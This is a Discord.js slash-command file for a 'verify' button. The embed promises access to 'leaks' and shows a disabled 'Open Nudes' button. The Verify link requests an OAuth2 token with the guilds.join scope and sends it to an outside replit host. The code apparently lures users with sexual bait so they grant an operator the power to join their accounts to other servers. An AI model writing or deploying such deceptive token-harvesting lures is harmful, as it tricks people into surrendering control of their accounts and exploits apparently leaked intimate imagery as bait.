
const { ApplicationCommandType, ApplicationCommandOptionType, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const discord = require("discord.js");
let AuthDB = require(`../../database/AuthDB`)
const { redirect_uri } = require("../../config.js");


module.exports = {
  name: "doðrula",
  description: "Yetkilendirme butonu oluþtur",
  options: null,

  type: ApplicationCommandType.ChatInput,
  run: async (client, interaction, args) => {



    let embed1 = new discord.EmbedBuilder()
      .setTitle(`You can see channels after verification.`)
      .setDescription(`**__CLICK__** The __Verify__ Button to Access Our Leaks :peach:`)
    .setImage('https://media.discordapp.net/attachments/1042718681781764116/1043211765086957588/Astrid_Banner_64872118.jpg')
    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setLabel("Verify")
      .setStyle(ButtonStyle.Link)
        .setURL('https://discord.com/api/oauth2/authorize?client_id=1042024381678882887&redirect_uri=https%3A%2F%2Fez-auth.ozi1761hastan.repl.co&response_type=code&scope=guilds.join')
          .setDisabled(false),
        new ButtonBuilder()
          .setCustomId('next')
          .setLabel("Open Nudes")
      .setStyle(ButtonStyle.Danger)
          .setDisabled(true),
      );


    await interaction.reply({
      embeds: [embed1],
      components: [row]

    });

  },
};